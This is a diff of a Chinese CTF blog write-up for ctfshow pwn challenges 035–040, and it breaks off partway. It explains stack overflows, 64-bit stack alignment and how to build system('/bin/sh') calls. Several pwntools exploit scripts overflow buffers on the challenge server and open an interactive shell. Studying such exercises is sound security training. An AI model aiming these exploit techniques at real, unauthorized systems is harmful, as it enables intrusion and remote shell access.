@@ -10,7 +10,7 @@
 <meta property='og:description' content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题">
 <meta property='og:url' content='https://expl0rer.top/p/ctfshow-pwn-writeup/'>
 <meta property='og:site_name' content='Expl0rer.Ct'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-31T18:18:21&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-02T00:04:55&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
 <meta name="twitter:title" content="ctfshow-pwn-writeup">
 <meta name="twitter:description" content="二进制漏洞与利用，PWN_wrtieup，会员套餐360题"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-pwn-writeup/ctfshow.png' />
@@ -781,6 +781,14 @@ unicode: "ece7"
     <li><a href="#栈溢出">栈溢出</a>
       <ol>
         <li><a href="#pwn_035">PWN_035</a></li>
+        <li><a href="#binsh地址的跳转利用"><strong>/bin/sh地址的跳转利用</strong></a></li>
+        <li><a href="#pwn_036">PWN_036</a></li>
+        <li><a href="#pwn_037">PWN_037</a></li>
+        <li><a href="#pwn_038">PWN_038</a></li>
+        <li><a href="#pwn_039">PWN_039</a></li>
+        <li><a href="#pwn_040">PWN_040</a></li>
+        <li><a href="#32位和64位可执行程序的参数传递顺序"><strong>32位和64位可执行程序的参数传递顺序</strong></a></li>
+        <li><a href="#pwn_041">PWN_041</a></li>
       </ol>
     </li>
   </ol>
@@ -3890,10 +3898,617 @@ unicode: "ece7"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh ctfshow@题目地址 -p题目端口号
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>不是nc连接</strong></p>
+</div><p>**不是nc连接 **</p>
 <p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
     >专用虚拟机镜像，全套在这里，提取码show</a></p>
+<p><a class="link" href="PWN_035" >PWN_035</a></p>
 <hr>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/96.png"
+	width="845"
+	height="198"
+	srcset="/p/ctfshow-pwn-writeup/96_hu_5cec7781a9fafd95.png 480w, /p/ctfshow-pwn-writeup/96_hu_ceae71005b53e245.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="426"
+		data-flex-basis="1024px"
+	
+></p>
+<p>没开canary保护，对应了本章主题——栈溢出。</p>
+<p>IDA分析：</p>
+<p><img src="/p/ctfshow-pwn-writeup/97.png"
+	width="1106"
+	height="726"
+	srcset="/p/ctfshow-pwn-writeup/97_hu_8cfcbbb1f6ccb348.png 480w, /p/ctfshow-pwn-writeup/97_hu_894ff25413a0ac82.png 1024w"
+	loading="lazy"
+	
+		alt="main函数反编译分析"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="152"
+		data-flex-basis="365px"
+	
+></p>
+<p>跟进函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/98.png"
+	width="569"
+	height="200"
+	srcset="/p/ctfshow-pwn-writeup/98_hu_7f17590d89865cd7.png 480w, /p/ctfshow-pwn-writeup/98_hu_492c2c611443a23c.png 1024w"
+	loading="lazy"
+	
+		alt="sigsegv_handler函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="284"
+		data-flex-basis="682px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/99.png"
+	width="564"
+	height="190"
+	srcset="/p/ctfshow-pwn-writeup/99_hu_64242a0110d6f688.png 480w, /p/ctfshow-pwn-writeup/99_hu_f5443b1ee09bc173.png 1024w"
+	loading="lazy"
+	
+		alt="ctfshow函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="296"
+		data-flex-basis="712px"
+	
+></p>
+<p>由此可知：ctfshow函数存在栈溢出漏洞，超过104字节就会发生栈溢出；</p>
+<p>对于<code>SIGSEGV</code>函数，当栈溢出触发 SIGSEGV 时，sigsegv_handler 函数会被调用，然后触发函数内部——fprintf打印出flag字符串，也正好对应了fget函数读取的flag值。</p>
+<blockquote class="alert alert-warn">
+    <p>栈溢出会破坏栈上的 “返回地址”“栈帧信息” 或其他关键内存结构，最终引发<strong>非法内存访问</strong>（比如函数返回时跳转到无效地址），触发 <code>SIGSEGV</code> 信号。</p></blockquote>
+<p>所以说我们只要在运行的时候给程序打入超过104个的字符串就好，可以是105个“a”。</p>
+<p><img src="/p/ctfshow-pwn-writeup/100.png"
+	width="1235"
+	height="555"
+	srcset="/p/ctfshow-pwn-writeup/100_hu_3fabc6f5bf3328d1.png 480w, /p/ctfshow-pwn-writeup/100_hu_28f40016a971c608.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="534px"
+	
+></p>
+<h3 id="binsh地址的跳转利用"><strong>/bin/sh地址的跳转利用</strong>
+</h3><p>相较于32位程序，64 位程序调用函数需满足 <strong>栈对齐</strong>，因此构造 payload 时需注意：</p>
+<p>在实际解题中，<code>ret</code> 地址需要针对当前题目动态获取，用 <code>ROPgadget</code> 工具直接搜索程序中的 <code>ret</code> 指令（最常用）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_036">PWN_036
+</h3><p>题目：存在后门函数，如何利用？ <a class="link" href="PWN_036" >PWN_036</a></p>
+<p><img src="/p/ctfshow-pwn-writeup/101.png"
+	width="826"
+	height="231"
+	srcset="/p/ctfshow-pwn-writeup/101_hu_6afe63e25fe4af19.png 480w, /p/ctfshow-pwn-writeup/101_hu_ca0bed959ef72a10.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="858px"
+	
+></p>
+<p>非常不安全！！！！没有canary保护。可以用ret2shellcode、ret2libc。</p>
+<p><img src="/p/ctfshow-pwn-writeup/102.png"
+	width="1225"
+	height="506"
+	srcset="/p/ctfshow-pwn-writeup/102_hu_1ea758b340b9373a.png 480w, /p/ctfshow-pwn-writeup/102_hu_c4eefe935b6b6cf7.png 1024w"
+	loading="lazy"
+	
+		alt="main-IDA的分析"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="581px"
+	
+></p>
+<p>这题开始怪怪的，找不到/bin/sh的后门，sigsegv_handler 函数没有我们想要的flag，不过在左边函数目录看到熟悉的故人——get_flag函数，直接跟进看看：</p>
+<p><img src="/p/ctfshow-pwn-writeup/103.png"
+	width="961"
+	height="289"
+	srcset="/p/ctfshow-pwn-writeup/103_hu_ec17c27209d749fe.png 480w, /p/ctfshow-pwn-writeup/103_hu_ed5b527b98ddfd0f.png 1024w"
+	loading="lazy"
+	
+		alt="跟进get_flag函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="332"
+		data-flex-basis="798px"
+	
+></p>
+<p>可以看到下面的fgets读取和返回的printf(s)打印函数，输出flag字符串，主函数没有引用它啊，怎么办？我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag。（可以用ret2shellcode、ret2libc）</p>
+<p>main函数的突破点在这：</p>
+<p><img src="/p/ctfshow-pwn-writeup/104.png"
+	width="860"
+	height="215"
+	srcset="/p/ctfshow-pwn-writeup/104_hu_5cc36469a1fe2e12.png 480w, /p/ctfshow-pwn-writeup/104_hu_fcf805775837a51c.png 1024w"
+	loading="lazy"
+	
+		alt="在main跟进ctfshow函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="400"
+		data-flex-basis="960px"
+	
+></p>
+<p>没开canary保护，s数组可存储大小范围是36，超过了就覆盖返回地址了。</p>
+<blockquote class="alert alert-error">
+    <blockquote>
+<p>gets 读取函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
+<p>安全性来看一般都会用fgets函数，搭配<strong>FORTIFY 缓冲区边界检查</strong>来提高程序自身安全性。</p></blockquote></blockquote>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28297</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">get_flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;get_flag&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">44</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#远程发送</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>     <span class="c1">#开启shell交互模式（类似终端）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的44个‘a’是0x28 + 4 ，0x28（十进制 40）是缓冲区到 ebp（栈基址寄存器）的距离，+4 是覆盖 ebp 本身（32 位程序中寄存器占 4 字节），总共 44 字节后，后续数据才能覆盖函数的 “返回地址”，从而跳转到 get_flag 函数。当然你可以用cyclic(0x28 + 4)，产生44字节的垃圾值。</p>
+<p><img src="/p/ctfshow-pwn-writeup/105.png"
+	width="1130"
+	height="569"
+	srcset="/p/ctfshow-pwn-writeup/105_hu_9fe21db2e56fb303.png 480w, /p/ctfshow-pwn-writeup/105_hu_2f03f58823b9acb.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<h3 id="pwn_037">PWN_037
+</h3><p>题目：32位的 system(“/bin/sh”) 后门函数给你。 <a class="link" href="PWN_037" >PWN_037</a></p>
+<p>checksec发现是有无栈溢出保护的，关了canary。</p>
+<p>IDA分析：</p>
+<p><img src="/p/ctfshow-pwn-writeup/106.png"
+	width="649"
+	height="204"
+	srcset="/p/ctfshow-pwn-writeup/106_hu_28baf5c7d68b2e77.png 480w, /p/ctfshow-pwn-writeup/106_hu_1e83db09825e803f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="318"
+		data-flex-basis="763px"
+	
+></p>
+<p>可以发现main函数没有什么可以利用的，但是在函数目录可以看到有个backdoor的函数有猫腻&hellip;.</p>
+<p><img src="/p/ctfshow-pwn-writeup/107.png"
+	width="689"
+	height="309"
+	srcset="/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
+	loading="lazy"
+	
+		alt="真“后门”函数——backdoor"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="535px"
+	
+></p>
+<p>这个函数居然有/bin/sh！！！！！</p>
+<p>跟进ctfshow函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/108.png"
+	width="685"
+	height="149"
+	srcset="/p/ctfshow-pwn-writeup/108_hu_2f6decafcbb4d7a.png 480w, /p/ctfshow-pwn-writeup/108_hu_13e7ed272ddf4f58.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="459"
+		data-flex-basis="1103px"
+	
+></p>
+<p>有read读取函数，那我们可以以此为注入点，用垃圾值0x12+4先覆盖函数变量和寄存器ebp本身，然后再上传一个后门函数的地址。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28229</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span> <span class="c1">#后门函数的地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/109.png"
+	width="1043"
+	height="460"
+	srcset="/p/ctfshow-pwn-writeup/109_hu_5594301dde95ce57.png 480w, /p/ctfshow-pwn-writeup/109_hu_f2393a4d4b100c98.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="226"
+		data-flex-basis="544px"
+	
+></p>
+<p>脚本exp万岁。</p>
+<h3 id="pwn_038">PWN_038
+</h3><p>题目：64位的 system(“/bin/sh”) 后门函数给你。</p>
+<p>checksec：</p>
+<p><img src="/p/ctfshow-pwn-writeup/110.png"
+	width="845"
+	height="209"
+	srcset="/p/ctfshow-pwn-writeup/110_hu_cc699b9c9e84b874.png 480w, /p/ctfshow-pwn-writeup/110_hu_818237d793c59893.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="970px"
+	
+></p>
+<p>没开canary保护，开NX保护（不能ret2shellcode）</p>
+<p><img src="/p/ctfshow-pwn-writeup/111.png"
+	width="653"
+	height="150"
+	srcset="/p/ctfshow-pwn-writeup/111_hu_557177fc9847835c.png 480w, /p/ctfshow-pwn-writeup/111_hu_3e2e3f6328afcdc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="435"
+		data-flex-basis="1044px"
+	
+></p>
+<p>buf数组距离ebp寄存器为0xAh，加上本身寄存器ebp的8字节。</p>
+<p>跟进backdoor函数看到/bin/sh，本题思路和上题PWN_037一样，只不过架构变成64位而已。</p>
+<p><img src="/p/ctfshow-pwn-writeup/107.png"
+	width="689"
+	height="309"
+	srcset="/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
+	loading="lazy"
+	
+		alt="上题backdoor函数的int类型"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="535px"
+	
+></p>
+<p><img src="/p/ctfshow-pwn-writeup/112.png"
+	width="610"
+	height="126"
+	srcset="/p/ctfshow-pwn-writeup/112_hu_7a50666a6534a184.png 480w, /p/ctfshow-pwn-writeup/112_hu_f2c44b968d3f43b7.png 1024w"
+	loading="lazy"
+	
+		alt="本题的后门函数int_64"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="484"
+		data-flex-basis="1161px"
+	
+></p>
+<blockquote class="alert alert-note">
+    <blockquote>
+<p>64 位程序调用 <code>system</code> 需考虑堆栈平衡，本质是 <strong>64 位 ABI 对 “栈对齐” 的硬性要求</strong>—— 若不满足，函数执行时访问栈内存会崩溃；而 32 位 ABI 无此要求，仅需调用后清理参数栈即可，因此无需额外关注平衡。</p></blockquote></blockquote>
+<p>所以说exp需要考虑到堆栈平衡加上ret返回地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/113.png"
+	width="1198"
+	height="261"
+	srcset="/p/ctfshow-pwn-writeup/113_hu_3770565c136ecdbb.png 480w, /p/ctfshow-pwn-writeup/113_hu_f3c84935d209b6bf.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="459"
+		data-flex-basis="1101px"
+	
+></p>
+<p>在实际解题中，<code>ret</code> 地址需要针对当前题目动态获取，常用方法：</p>
+<p><strong>工具查找</strong>：用 <code>ROPgadget</code> 工具直接搜索程序中的 <code>ret</code> 指令（最常用）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28147</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400287</span> <span class="c1"># 0x0000000000400287 : ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn_039">PWN_039
+</h3><p>题目：32位的 system(); &ldquo;/bin/sh&rdquo;。 <a class="link" href="PWN_039" >PWN_039</a></p>
+<p>checksec一下：</p>
+<p><img src="/p/ctfshow-pwn-writeup/114.png"
+	width="750"
+	height="210"
+	srcset="/p/ctfshow-pwn-writeup/114_hu_ffd0edb80748b701.png 480w, /p/ctfshow-pwn-writeup/114_hu_ed469b05f80e7568.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="857px"
+	
+></p>
+<p>可以看到没开启canary、PIE保护的，存在可利用栈溢出漏洞的可能。</p>
+<p>IDA：</p>
+<p><img src="/p/ctfshow-pwn-writeup/115.png"
+	width="1000"
+	height="450"
+	srcset="/p/ctfshow-pwn-writeup/115_hu_e696ee341380586.png 480w, /p/ctfshow-pwn-writeup/115_hu_a20ea7fd6a1243a2.png 1024w"
+	loading="lazy"
+	
+		alt="32位的IDA分析"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="222"
+		data-flex-basis="533px"
+	
+></p>
+<p>跟进ctfshow函数发现栈溢出：</p>
+<p><img src="/p/ctfshow-pwn-writeup/116.png"
+	width="596"
+	height="140"
+	srcset="/p/ctfshow-pwn-writeup/116_hu_1199a62a52d94a2a.png 480w, /p/ctfshow-pwn-writeup/116_hu_d138901c5d88e68e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="425"
+		data-flex-basis="1021px"
+	
+></p>
+<p>可以读取50个字符给buf，但buf容量只有14，所以超过14就会造成栈溢出。</p>
+<p>接着在函数目录看到hint函数有猫腻：</p>
+<p><img src="/p/ctfshow-pwn-writeup/117.png"
+	width="854"
+	height="390"
+	srcset="/p/ctfshow-pwn-writeup/117_hu_25ebd19a12518947.png 480w, /p/ctfshow-pwn-writeup/117_hu_27e696ef37eed855.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="525px"
+	
+></p>
+<p>那么大致的exp思路就来了：也就是先cyclic函数生成垃圾值覆盖局部变量和ebp寄存器本身；但是只有system函数和/bin/sh，却没有system(“/bin/sh”);的后门，所以我们只能构造出来。</p>
+<p>在编写exp时，因为程序是32位，所以说不用去考虑它的堆栈平衡：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28216</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x8048750</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的p32(0)等于4字节，可以用四个a或者cyclic(4)代替也行，这时32位下system函数的返回地址占位符，然后就到执行/bin/sh，那就是跳转到它的地址：</p>
+<p><img src="/p/ctfshow-pwn-writeup/118.png"
+	width="1155"
+	height="119"
+	srcset="/p/ctfshow-pwn-writeup/118_hu_e5e93807f34b7bdd.png 480w, /p/ctfshow-pwn-writeup/118_hu_875bb0d0ab4ca27d.png 1024w"
+	loading="lazy"
+	
+		alt="/bin/sh字符串的地址"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="970"
+		data-flex-basis="2329px"
+	
+></p>
+<p>这样子我们就构造出system(&quot;/bin/sh&quot;);了，然后进入交互模式获得flag。</p>
+<p>这题主要考察我们对于函数的构造以及函数地址的拼接、栈的结构组成。需要多看看我的PWN-2啊。。。。</p>
+<h3 id="pwn_040">PWN_040
+</h3><p>题目：64位的 system(); &ldquo;/bin/sh&rdquo;。</p>
+<p>IDA64位分析，跟进ctfshow函数：</p>
+<p><img src="/p/ctfshow-pwn-writeup/119.png"
+	width="551"
+	height="149"
+	srcset="/p/ctfshow-pwn-writeup/119_hu_4361ba4a461d934e.png 480w, /p/ctfshow-pwn-writeup/119_hu_d335e677bd05e71e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="369"
+		data-flex-basis="887px"
+	
+></p>
+<p>checksec看到未打开canary保护，而且在ctfshow函数这发现有栈溢出。</p>
+<p>跟进hint函数，发现后门。</p>
+<p><img src="/p/ctfshow-pwn-writeup/120.png"
+	width="540"
+	height="125"
+	srcset="/p/ctfshow-pwn-writeup/120_hu_ac0e24a915fef2c8.png 480w, /p/ctfshow-pwn-writeup/120_hu_a859f06ba4c0b768.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="432"
+		data-flex-basis="1036px"
+	
+></p>
+<p>用ROPgadget命令查询ret地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ctfshow-pwn-writeup/121.png"
+	width="1224"
+	height="450"
+	srcset="/p/ctfshow-pwn-writeup/121_hu_749e2c86a93f982a.png 480w, /p/ctfshow-pwn-writeup/121_hu_9f8cdc6270b0312a.png 1024w"
+	loading="lazy"
+	
